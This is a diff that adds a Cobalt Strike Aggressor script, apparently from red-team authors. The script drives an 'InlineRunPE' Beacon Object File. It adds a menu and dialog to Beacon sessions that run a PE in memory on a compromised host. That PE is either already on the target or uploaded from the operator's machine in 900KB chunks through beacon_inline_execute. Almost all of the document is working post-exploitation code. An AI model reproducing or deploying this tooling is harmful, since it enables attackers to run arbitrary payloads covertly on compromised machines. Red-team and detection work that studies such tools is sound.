@@ -1,0 +1,85 @@
+sub readAllFileData {
+    $fileHandle = openf($1);
+    $fileData = readb($fileHandle, -1);
+    closef($fileHandle);  
+    return $fileData;  
+}
+
+popup beacon_top {
+  item "InlineRunPE"{
+    local('$bid');
+    foreach $bid ($1){
+      &InlineRunPEDialog($bid);
+    }
+  }
+}
+
+sub InlineRunPE {
+    local('$bid $data $state $count $pename $parameter $localPath')
+    $bid = $3['bid'];
+    $parameter  = $3['Argument'];
+    $filePath = $3['file'];
+    btask($bid, "[+] InlineRunPE-BOF by 7uckZero && halfRedteam");
+    btask($bid, "[+] Run $filePath $parameter")
+    # 加载bof
+    $handle = openf(script_resource("source.obj"));
+	$bofBytes = readb($handle,-1);
+	closef($handle);
+
+    if ($3['isLocal'] eq "HisComputer"){
+        $bLocal = 1;
+		$args = bof_pack($bid, "izz",$bLocal,$filePath,$parameter);
+		beacon_inline_execute($bid, $bofBytes, "go", $args);
+        return;
+    }
+
+    if ($3['isLocal'] eq "MyComputer") {
+         # read shellcode
+        if(-exists $filePath) {
+            $data = readAllFileData($filePath);
+        } else {
+            blog($bid, "[!] The file $remotePath is not found");
+            return;
+        }
+
+        $totalSize = strlen($data);
+        blog($bid,"[+] Total size: $totalSize");
+
+        $chunkSize = 1024 * 900 ;
+        $numChunks = $totalSize / $chunkSize;
+        $remainder = $totalSize % $chunkSize;
+        $index = 0;
+
+        $state = 0; # 记录状态，1表示发送完成
+
+        for($i = 0; $i < $numChunks; $i++){ 
+            $bLocal = 0;
+            $chunk = substr($data, $index, $index + $chunkSize);
+    	    $args = bof_pack($bid, "iiiiibz",$bLocal, $state, $totalSize, $index, $chunkSize, $chunk, $parameter) ;
+            $index += $chunkSize;
+            beacon_inline_execute($bid, $bofBytes, "go", $args);
+        }
+    
+        if($remainder > 0){
+            blog($bid, "upload end block size: $remainder !");
+            $state = 1;
+            $bLocal = 0;
+            $chunk = substr($data, $index, $index + $remainder);
+            $args = bof_pack($bid, "iiiiibz",$bLocal, $state, $totalSize, $index , $remainder, $chunk, $parameter) ;
+            beacon_inline_execute($bid, $bofBytes, "go", $args);
+            btask($1, "upload finish!");
+        }
+    }
+   
+
+}
+
+sub InlineRunPEDialog{
+	$dialog = dialog("Inline Run PE",%(bid => $1), &InlineRunPE);
+	dialog_description($dialog, "Inline Run PE");
+    drow_combobox($dialog, "isLocal" , "Where: ",@("HisComputer","MyComputer"));
+    drow_text($dialog, "file", "ExePath");
+	drow_text($dialog, "Argument",  "Argument:");
+	dbutton_action($dialog, "GO!");
+	dialog_show($dialog);
+}
